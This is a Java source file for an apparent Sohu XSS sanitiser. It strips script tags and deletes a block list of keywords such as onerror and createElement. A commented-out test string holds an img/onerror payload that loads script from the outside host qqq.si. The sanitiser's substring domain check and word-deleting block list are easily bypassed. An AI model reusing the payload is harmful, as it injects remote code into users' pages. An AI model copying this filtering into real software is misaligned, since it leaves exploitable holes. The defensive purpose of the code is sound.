package com.sohu.bp.elite.api.util;

import java.util.Iterator;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.apache.commons.lang3.StringUtils;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.sohu.bp.elite.Configuration;
import com.sohu.bp.util.FormatUtil;

/**
 * 对字符串进行安全过滤
 * create time: 2015年11月17日 下午10:56:04
 * @auther dexingyang
 */
public class SecurityUtil {

    private static Logger log = LoggerFactory.getLogger(SecurityUtil.class);
    
    private static final String regEx_script = "<[\\s]*?script[^>]*>[\\s\\S]*?</script[\\s]*?>"; // 定义script的正则表达式{或<script[^>]*?>[//s//S]*?<///script>
    private static final Pattern p_script = Pattern.compile(regEx_script, Pattern.CASE_INSENSITIVE);
    
    private static String[] filter_words = {"script","onerror","createElement","appendChild","onload","XMLHttpRequest"};
    private static boolean enableOuterLink = false;
    private static Configuration configuration = null;
    
    static{
        configuration = (Configuration)SpringUtil.getBean("configuration");
        
        String f_words = configuration.get("filter.words");
        if(f_words != null && f_words.length() > 0)
            filter_words = f_words.split(";");
        
        if(configuration.getBoolean("enable.outerlink")){
        	enableOuterLink = true;
        }
    }
    
    public static String filterWords(String input){
    	if(StringUtils.isBlank(input))
    		return input;
    	
    	Matcher m_script; 
        
        try {       
            m_script = p_script.matcher(input);      
            input = m_script.replaceAll(""); // 过滤script标签     
            
            //过滤如script字符串
            for(int i=0;i < filter_words.length;i++){
                input = input.replaceAll("(?i)"+filter_words[i], "");
            }
            
        } catch (Exception e) {    
            log.error("filter content error.",e);
        }      
    
        return input;// 返回文本字符串
    }
    
    /**
     * 对字符串内容进行安全过滤,是否过滤外链，由系统全局配置觉得
     * @param input
     * @return
     */
    public static String filterContent(String input){
    	return filterContent(input, enableOuterLink);
    }
    
    /**
     * 对字符串内容进行安全过滤
     * @param input
     * @param enableLink  是否允许外域链接
     */
    public static String filterContent(String input, boolean enableLink){
    	if(StringUtils.isBlank(input))
    		return input;
    	
        Matcher m_script; 
    
        try {       
            m_script = p_script.matcher(input);      
            input = m_script.replaceAll(""); // 过滤script标签     
            
            //过滤如script字符串
            for(int i=0;i < filter_words.length;i++){
                input = input.replaceAll("(?i)"+filter_words[i], "");
            }
            
            input = linkFilter(input, enableLink);
        } catch (Exception e) {    
            log.error("filter content error.",e);
        }      
    
        return input;// 返回文本字符串
    }
    
    /**
     * 对于非sohu域的链接进行过滤,对于是sohu域的链接,统一加上http头部
     * @param input
     * @Param enableAlink 是否允许A标签的外链
     * @return
     */
    public static String linkFilter(String input,boolean enableOuterLink)
    {
    	if(StringUtils.isBlank(input))
    		return input;
    	
        String content = "";
        
        try{
            Document doc = Jsoup.parse(input);
            
            //img标签的地址转换放到ImageHandler中,会把外域的图片下载转存到sohu域下
            //过滤a,iframe,link,script标签,video[src]暂时不加
            Elements eles = doc.select("a[href],link[href],iframe[src],script[src],img[src]");
            Iterator<Element> it = eles.iterator();
            String url = "";
            while(it.hasNext()){
                Element ele = (Element)it.next();
                String tagName = ele.tagName();
                
                //不能用ele.absUrl("src")方法,这种对于没有'http://'的情况会返回空串
                if("a".equals(tagName)){
                    url = ele.attr("href");
                    boolean isSohuDomain = isSohuDomain(url);
                    //不允许外链，则进行过滤
                    if(!isSohuDomain && !enableOuterLink){
                    	ele.after(ele.text());
                    	ele.remove();
                    }else{
                    	//判断链接是否以http://开头
                    	String lowerCaseUrl = url.toLowerCase();
                    	if(!lowerCaseUrl.startsWith("http://")&&!lowerCaseUrl.startsWith("https://")){
                    		ele.attr("href", "http://"+url);
                    	}
                    }
                }else if("iframe".equals(tagName)||"script".equals(tagName)||"link".equals(tagName)){
                	ele.remove();
                }else if("img".equals(tagName)){
                    url = ele.absUrl("src");    //对于图片不带'http://'头部的,直接清除到标签.其他情况交给ImageHandler处理
                    if(org.apache.commons.lang.StringUtils.isBlank(url)){
                        ele.remove();
                    }
                }
            }
            content = doc.body().html();
            content = FormatUtil.formatAfterJsoup(content);
        }catch(Exception e){
            log.error("handle http and out link error.",e);
        }
        
        return content;
    }
    
    public static boolean isSohuDomain(String url){
        if(org.apache.commons.lang.StringUtils.isBlank(url))
            return false;
        
        boolean ret = false;
        String uperCase = url.toUpperCase();
        if (uperCase.indexOf("SOHU.COM") > -1 
            || uperCase.indexOf("SOHU.NET") > -1 
            || uperCase.indexOf("ITC.CN") > -1
                ||uperCase.indexOf("FOCUS.CN") > -1
                || uperCase.indexOf("SOGOU.COM") > -1)
            ret = true;
        return ret;
    }
    
    public static void main(String args[]){
//        String testString = "<p><br /><script>sss</SCRIPT>ScRiPTbr /> onLoad,createELEMENT自己的 CMS 版本有更新请尽快更新！</p><p><img/onerror=with(body)appendChild(createElement(/script/.source)).src=alt alt=//qqq.si/Lwwf1G src=xx:x width=0>";
//        String result = filterContent(testString);
//        System.out.println(result);
        //String test2 = "清古建筑群的<a href=\"http://wapbaike.baidu.com/view/78824.htm?uid=9EDDF927AC493C660316206FAD7D88BA&ssid=0&pu=sz%401320_480%2Ccuid%408BD017C193AF4EC39180338376238006417219EA7OCQQJCMEJG%2Ccua%40640_1136_iphone_6.6.0.0_0%2Ccut%40iPhone6%252C1_8.1.3%2Cosname%40baiduboxapp%2Cctv%401%2Ccfrom%401099a%2Ccsrc%40app_box_txt%2Cta%40zbios_1_8.1_6_0.0%2Cusm%403&bd_page_type=1&from=1099a&st=3&step=3&net=1&ldr=2&statwiki=1\"></a>大噶尔噶<iFrame src=\"http://ads.xxx.com\"></Iframe>this is not real<script src=\"xx:sohu.com\"></script><link href=\"http://xxx.css\"/><img src=\"http://abc_da.png\"/>";
        String test2 = "[\"http://sucimg.itc.cn/avatarimg/s_1450948263823_1450948263866\"]";
    	String result2 = filterWords(test2);
        System.out.println(result2);
    }
}
